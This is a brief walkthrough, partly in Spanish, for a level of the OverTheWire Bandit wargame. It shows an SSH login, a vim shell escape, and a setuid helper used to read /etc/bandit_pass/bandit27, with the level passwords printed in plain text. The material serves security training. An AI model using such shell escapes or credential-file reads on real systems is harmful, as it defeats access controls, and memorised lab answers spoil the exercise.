
## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos Acceso
bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

## Solucion
```bash
─$ ssh bandit26@bandit.labs.overthewire.org -p 2220
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / /  _ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
:set shell=/bin/bash
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$ exit
:qa!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / /  _ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
------------------------
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to bandit.labs.overthewire.org closed.
                                                                                                                    


```
## Notas adicionales
| comando |  descripcion|
|---|----|


## Referencias



